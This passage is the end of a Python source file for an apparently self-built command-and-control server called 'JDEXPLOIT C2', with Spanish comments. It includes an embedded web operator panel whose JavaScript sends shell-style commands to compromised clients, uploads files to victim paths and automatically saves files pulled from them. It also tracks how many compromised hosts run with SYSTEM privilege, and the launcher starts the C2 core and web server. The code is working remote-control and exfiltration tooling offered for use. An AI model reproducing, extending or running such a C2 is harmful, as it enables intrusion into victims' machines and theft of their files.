            document.getElementById('uploadModal').style.display = 'block';
        }
        
        function closeUploadModal() {
            document.getElementById('uploadModal').style.display = 'none';
        }
        
        function performUpload() {
            const remotePath = document.getElementById('upload-remote-path').value;
            const data = document.getElementById('upload-data').value;
            
            if (!remotePath || !data) {
                alert("Remote path and data required");
                return;
            }
            
            fetch('/api/upload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    client_id: currentClientId,
                    remote_path: remotePath,
                    file_data: btoa(data)  // Convertir a Base64
                })
            })
            .then(r => r.json())
            .then(res => {
                addToTerminal(`[UPLOAD] ${res.response}`, '#ffff00');
                closeUploadModal();
            });
        }
        
        function sendTerminalCommand() {
            const cmd = document.getElementById('terminal-cmd').value.trim();
            if (!cmd || !currentClientId) return;
            
            addToTerminal('> ' + cmd, '#ff9999');
            document.getElementById('terminal-cmd').value = '';
            
            // Parsear comando
            let parts = cmd.split(' ');
            let command = parts[0];
            let args = parts.slice(1).join(' ');
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    client_id: currentClientId,
                    command: command,
                    args: args
                })
            })
            .then(r => r.json())
            .then(data => {
                handleResponse(data.response);
            })
            .catch(err => {
                addToTerminal(`[ERROR] ${err}`, '#ff0000');
            });
        }
        
        function handleResponse(response) {
            // Verificar si es una descarga (Base64)
            if (response && response.includes('Base64:')) {
                const match = response.match(/Base64: (.+)$/);
                if (match && match[1]) {
                    try {
                        const decoded = atob(match[1]);
                        // Guardar como archivo
                        const blob = new Blob([decoded], {type: 'application/octet-stream'});
                        const url = window.URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'downloaded_file.bin';
                        a.click();
                        addToTerminal('[✅] Archivo descargado automáticamente', '#00ff00');
                    } catch (e) {
                        addToTerminal(response, '#cccccc');
                    }
                } else {
                    addToTerminal(response, '#cccccc');
                }
            } else {
                addToTerminal(response, '#cccccc');
            }
        }
        
        function addToTerminal(text, color = '#cccccc') {
            const output = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.style.color = color;
            line.style.marginBottom = '4px';
            line.style.fontFamily = 'Courier New';
            line.style.fontSize = '13px';
            line.innerHTML = text.replace(/\\n/g, '<br>');
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }
        
        function updateStats() {
            const total = Object.keys(clients).length;
            const online = Object.values(clients).filter(c => c.status === 'online').length;
            const system = Object.values(clients).filter(c => c.privilege === 'SYSTEM').length;
            
            document.getElementById('total-clients').innerText = total;
            document.getElementById('online-clients').innerText = online;
            document.getElementById('system-clients').innerText = system;
            
            const uptime = Math.floor((Date.now() - startTime) / 1000);
            const hours = Math.floor(uptime / 3600);
            const minutes = Math.floor((uptime % 3600) / 60);
            const seconds = uptime % 60;
            document.getElementById('uptime').innerText = 
                `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        }
        
        // Soporte para tecla Enter
        document.getElementById('terminal-cmd').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendTerminalCommand();
            }
        });
        
        // Cargar inicial
        loadClients();
    </script>
</body>
</html>
        """
    
    def log_message(self, format, *args):
        """Suprime logs del servidor HTTP"""
        pass

# ============================================================================
# SERVIDOR HTTP THREADED
# ============================================================================
class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
    """Servidor HTTP con soporte multi-threading"""
    daemon_threads = True

# ============================================================================
# FUNCIÓN PRINCIPAL
# ============================================================================
def main():
    print(f"""
{Colors.RED}
     ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
     ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
     ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██   ██║██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚█████╔╝██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{Colors.END}
{Colors.GREEN}[🔥] JDEXPLOIT C2 - PROFESSIONAL EDITION{Colors.END}
{Colors.GREEN}[🔒] AES-256-GCM | ECDH Key Exchange | Secure Channel{Colors.END}
    """)
    
    print(f"{Colors.CYAN}[*] Iniciando C2 Core en {HOST}:{C2_PORT}{Colors.END}")
    c2 = C2Core()
    c2.start_time = datetime.datetime.now()
    c2.start()
    
    print(f"{Colors.CYAN}[*] Iniciando Web UI en http://{HOST}:{WEB_PORT}{Colors.END}")
    WebHandler.c2 = c2
    web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
    
    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Deteniendo servidores...{Colors.END}")
        c2.stop()
        web_server.shutdown()
        sys.exit(0)

if __name__ == '__main__':
    main()
